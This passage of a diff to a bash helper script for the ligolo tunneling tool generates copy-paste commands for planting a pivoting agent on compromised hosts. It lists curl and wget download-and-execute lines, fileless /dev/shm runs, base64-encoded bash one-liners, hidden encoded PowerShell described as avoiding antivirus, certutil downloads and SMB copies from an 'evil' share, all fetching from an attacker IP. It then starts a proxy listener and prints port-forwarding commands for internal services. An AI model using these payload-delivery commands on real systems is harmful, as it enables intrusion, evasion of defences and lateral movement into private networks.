     echo -e "  ${CYAN}# 2. wget -> /tmp (base64 one-liner)${NC}"
     echo -e "  ${GRAY}bash <(echo $LINUX_WGET_TMP_B64|base64 -d)${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 3. curl -> /tmp (standard)${NC}"
     echo -e "  ${YELLOW}curl -so /tmp/$LINUX_AGENT http://$TUNIP:$HTTP_PORT/$LINUX_AGENT && chmod +x /tmp/$LINUX_AGENT && /tmp/$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 4. curl -> /tmp (base64 one-liner)${NC}"
     echo -e "  ${GRAY}bash <(echo $LINUX_CURL_TMP_B64|base64 -d)${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 5. Fileless - curl -> /dev/shm (no disk write, auto-cleanup)${NC}"
     echo -e "  ${LGRAY}f=/dev/shm/.\$\$;curl -so \$f http://$TUNIP:$HTTP_PORT/$LINUX_AGENT&&chmod +x \$f&&\$f -connect $TUNIP:$PROXY_PORT -ignore-cert;rm -f \$f${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 6. Fileless /dev/shm (base64 encoded)${NC}"
     echo -e "  ${GRAY}bash <(echo $LINUX_SHM_B64|base64 -d)${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 7. wget -> current dir (writable dir, no /tmp access)${NC}"
     echo -e "  ${YELLOW}wget http://$TUNIP:$HTTP_PORT/$LINUX_AGENT -O ./$LINUX_AGENT && chmod +x ./$LINUX_AGENT && ./$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 8. wget -> current dir (base64 one-liner)${NC}"
     echo -e "  ${GRAY}bash <(echo $LINUX_WGET_CWD_B64|base64 -d)${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 9. curl -> current dir (writable dir, no /tmp access)${NC}"
     echo -e "  ${YELLOW}curl -so ./$LINUX_AGENT http://$TUNIP:$HTTP_PORT/$LINUX_AGENT && chmod +x ./$LINUX_AGENT && ./$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 10. curl -> current dir (base64 one-liner)${NC}"
     echo -e "  ${GRAY}bash <(echo $LINUX_CURL_CWD_B64|base64 -d)${NC}"
     echo ""
@@ -615,58 +613,46 @@ ligoloup() {
     echo -e "  WINDOWS AGENT COMMANDS  [ $WIN_AGENT ]"
     echo -e "==============================================${NC}"
     echo ""
-
-    echo -e "  ${CYAN}# 1. Standard SMB copy -> C:\Windows\Temp + execute${NC}"
+    echo -e "  ${CYAN}# 1. Standard SMB copy -> C:\\Windows\\Temp + execute${NC}"
     printf "  ${YELLOW}copy \\\\\\\\%s\\\\evil\\\\%s C:\\\\Windows\\\\Temp\\\\%s && C:\\\\Windows\\\\Temp\\\\%s -connect %s:%s -ignore-cert${NC}\n" \
         "$TUNIP" "$WIN_AGENT" "$WIN_AGENT" "$WIN_AGENT" "$TUNIP" "$PROXY_PORT"
     echo ""
-
     echo -e "  ${CYAN}# 2. Fileless (direct from SMB share, no local copy)${NC}"
     printf "  ${YELLOW}\\\\\\\\%s\\\\evil\\\\%s -connect %s:%s -ignore-cert${NC}\n" "$TUNIP" "$WIN_AGENT" "$TUNIP" "$PROXY_PORT"
     echo ""
-
-    echo -e "  ${CYAN}# 3. PowerShell HTTP -> C:\Windows\Temp${NC}"
+    echo -e "  ${CYAN}# 3. PowerShell HTTP -> C:\\Windows\\Temp${NC}"
     echo -e "  ${YELLOW}(New-Object Net.WebClient).DownloadFile('http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT}','C:\\Windows\\Temp\\${WIN_AGENT}'); C:\\Windows\\Temp\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 4. PowerShell HTTP -> Temp (unicode base64, Evil-WinRM / no &&)${NC}"
     echo -e "  ${GRAY}powershell -NoP -NonI -W Hidden -Enc $PS_HTTP_ENC${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 5. certutil HTTP download -> Temp${NC}"
     echo -e "  ${YELLOW}certutil -urlcache -split -f http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT} C:\\Windows\\Temp\\${WIN_AGENT} && C:\\Windows\\Temp\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 6. SMB copy -> Temp (stealth PowerShell)${NC}"
     printf "  ${LGRAY}copy \\\\\\\\%s\\\\evil\\\\%s C:\\\\Windows\\\\Temp\\\\%s ; & 'C:\\\\Windows\\\\Temp\\\\%s' -connect %s:%s -ignore-cert${NC}\n" \
         "$TUNIP" "$WIN_AGENT" "$WIN_AGENT" "$WIN_AGENT" "$TUNIP" "$PROXY_PORT"
     echo ""
-
     echo -e "  ${CYAN}# 7. SMB copy -> Temp (unicode base64, avoids AV / NHAS style)${NC}"
     echo -e "  ${GRAY}powershell -NoP -NonI -W Hidden -Enc $PS_SMB_ENC${NC}"
     echo ""
-
-    echo -e "  ${CYAN}# 8. IWR (Invoke-WebRequest) -> C:\Windows\Temp${NC}"
+    echo -e "  ${CYAN}# 8. IWR (Invoke-WebRequest) -> C:\\Windows\\Temp${NC}"
     echo -e "  ${YELLOW}iwr -Uri 'http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT}' -OutFile 'C:\\Windows\\Temp\\${WIN_AGENT}'; C:\\Windows\\Temp\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 9. IWR -> current folder (drop-in, no path needed)${NC}"
     echo -e "  ${YELLOW}iwr -Uri 'http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT}' -OutFile .\\${WIN_AGENT}; .\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 10. IWR current folder (unicode base64, Evil-WinRM / no &&)${NC}"
     echo -e "  ${GRAY}powershell -NoP -NonI -W Hidden -Enc $PS_IWR_CWD_ENC${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 11. IWR one-liner (powershell -c, useful from cmd.exe)${NC}"
     echo -e "  ${GRAY}powershell -c \"iwr 'http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT}' -OutFile C:\\Windows\\Temp\\${WIN_AGENT}; & C:\\Windows\\Temp\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert\"${NC}"
     echo ""
     echo ""
-    echo ""
-    echo -e "  ${CYAN}# run -> ligolofix <- to start running the ligolomachines, localrouting now works with autoroute."
+    echo -e "  ${CYAN}# run -> ligolofix <- to start running the ligolomachines, localrouting now works with autoroute.${NC}"
 
     # Run proxy with full path, from LIGOLO directory
-    sudo $PROXY_BIN -selfcert -laddr 0.0.0.0:$PROXY_PORT
+    sudo "$PROXY_BIN" -selfcert -laddr 0.0.0.0:$PROXY_PORT
 }
 
 # ============================================================================
@@ -675,7 +661,6 @@ ligoloup() {
 
 ligoloscan() {
     PIVOT_NUM=${1:-1}
-
     echo ""
     echo -e "${BOLD}=============================================="
     echo -e "  Bulk Listener Setup for Pivot $PIVOT_NUM"
@@ -683,11 +668,9 @@ ligoloscan() {
     echo ""
     echo -e "  ${GRAY}Copy & paste these in ligolo console after autoroute${NC}"
     echo ""
-
     for port in 80 443 445 3389 3306 1433 5985 5986 9200 8080 8443; do
         echo -e "  ${YELLOW}listener_add --addr 240.0.0.$PIVOT_NUM:$port --to 127.0.0.1:$port --tcp${NC}"
     done
-
     echo ""
 }
 
@@ -697,19 +680,18 @@ ligolohelp() {
     echo -e "  LIGOLO Quick Reference"
     echo -e "==============================================${NC}"
     echo ""
-    echo -e "  ${CYAN}tunnel_list${NC}           ${GRAY}# Show all active sessions${NC}"
-    echo -e "  ${CYAN}session${NC}               ${GRAY}# Switch to a session${NC}"
-    echo -e "  ${CYAN}autoroute${NC}             ${GRAY}# Auto setup interface + routes + tunnel${NC}"
-    echo -e "  ${CYAN}listener_add${NC}          ${GRAY}# Forward a port through tunnel${NC}"
-    echo -e "  ${CYAN}listener_list${NC}         ${GRAY}# Show all forwarders${NC}"
-    echo -e "  ${CYAN}listener_stop --id N${NC}  ${GRAY}# Stop a forwarder${NC}"
-    echo -e "  ${CYAN}interface_list${NC}        ${GRAY}# Show all TUN interfaces${NC}"
-    echo -e "  ${CYAN}ifconfig${NC}              ${GRAY}# Show agent's network interfaces${NC}"
+    echo -e "  ${CYAN}tunnel_list${NC}             ${GRAY}# Show all active sessions${NC}"
+    echo -e "  ${CYAN}session${NC}                 ${GRAY}# Switch to a session${NC}"
+    echo -e "  ${CYAN}autoroute${NC}               ${GRAY}# Auto setup interface + routes + tunnel${NC}"
+    echo -e "  ${CYAN}listener_add${NC}            ${GRAY}# Forward a port through tunnel${NC}"
+    echo -e "  ${CYAN}listener_list${NC}           ${GRAY}# Show all forwarders${NC}"
+    echo -e "  ${CYAN}listener_stop --id N${NC}    ${GRAY}# Stop a forwarder${NC}"
+    echo -e "  ${CYAN}interface_list${NC}          ${GRAY}# Show all TUN interfaces${NC}"
+    echo -e "  ${CYAN}ifconfig${NC}                ${GRAY}# Show agent's network interfaces${NC}"
     echo ""
 }
 
 # ============================================================================
 # RUN MAIN FUNCTION
 # ============================================================================
-
 ligoloup
